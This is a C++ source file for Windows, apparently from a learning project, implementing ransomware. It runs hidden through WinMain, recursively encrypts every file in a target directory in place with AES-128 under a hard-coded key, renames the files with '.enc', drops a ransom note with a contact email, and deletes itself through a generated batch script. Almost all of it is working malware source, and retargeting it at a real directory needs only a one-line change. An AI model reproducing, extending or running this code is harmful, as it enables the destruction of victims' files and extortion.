#include <openssl/evp.h>
#include <filesystem>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

#define AES_BLOCK_SIZE 16

using recursive_directory_iterator = std::filesystem::recursive_directory_iterator;

void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename);
void leaveNote(std::string target_dir, const char* message);
void deleteSelf();

// basically the same thing as basic_ransomware.cpp, except this time the ransomware deletes itself after it finishes
// we use this int CALLBACK WinMain() instead of int main() so that the program automatically runs in the background without showing the user anything
int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

    std::string target_dir = "dummy_directory_1";   // this is the target directory for the ransomware
    std::filesystem::path myPath = target_dir;
    std::string file;

    unsigned char key_chars[] = "Hard-coded key here.";     // ransomware's encryption key
    unsigned char iv[] = "some random IV value";             // ransomware's initialization value

    // loop that recursively visits every single file in the target directory and encrypts them
    for (const auto& dirEntry : recursive_directory_iterator(myPath)){

        if (!dirEntry.is_directory()){

            file = dirEntry.path().generic_string();
            encryptFile(key_chars, iv, file.c_str());

            std::filesystem::path oldName = file;
            std::filesystem::path newName = oldName.string() + ".enc";
            std::filesystem::rename(oldName, newName);
        }
    }
    const char* ransom_message = "Harharhar! You've been hit by ransomware! Contact this email to negotiate: not_a_hacker@gmail.com.";
    leaveNote(target_dir, ransom_message);
    deleteSelf();
    return 0;
}

// funcion that encrypts a file given an encryption key and IV
// for more granular comments on this, check encrypt_file2.cpp in the encryption tests folder
void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename){
    int bytes_read;
    int bytes_written;
    unsigned char input_buffer[AES_BLOCK_SIZE];
    unsigned char output_buffer[AES_BLOCK_SIZE];
    FILE* file_ptr = fopen(filename, "r+b");
    
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb(), NULL, key_chars, iv);

    while(1){
        long pos = ftell(file_ptr);
        bytes_read = fread(input_buffer, 1, AES_BLOCK_SIZE, file_ptr);
        int status = EVP_EncryptUpdate(ctx, output_buffer, &len, input_buffer, bytes_read);
        fseek(file_ptr, pos, SEEK_SET);
        fwrite(output_buffer, 1, bytes_read, file_ptr);
        fseek(file_ptr, pos+bytes_read, SEEK_SET);
        if (bytes_read < AES_BLOCK_SIZE){
            break;
        }
    }
    EVP_CIPHER_CTX_free(ctx);
    fclose(file_ptr);
}

// function to leave the ransom note
void leaveNote(std::string target_dir, const char* message){
    std::string ransom_note_file = target_dir + "/ransom_note.txt";
    FILE* notePtr = fopen(ransom_note_file.c_str(), "w");
    fprintf(notePtr, "%s", message);
    fclose(notePtr);
}

// this function creates a batch script to delete the ransomware after it finishes
// once all the files are encrypted, this function will start a new process and run the deletion script there
void deleteSelf(){
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);      

    std::string batchFileName = "del.bat";
    std::ofstream batchFile(batchFileName);
    batchFile << "@echo off\n";
    batchFile << "timeout /t 2 > nul\n"; 
    batchFile << "del \"" << exePath << "\"\n";
    batchFile << "del \"%~f0\"\n";       
    batchFile.close();

    // some very bizarre code that I don't even understand yet, just got it online
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, const_cast<char*>(batchFileName.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}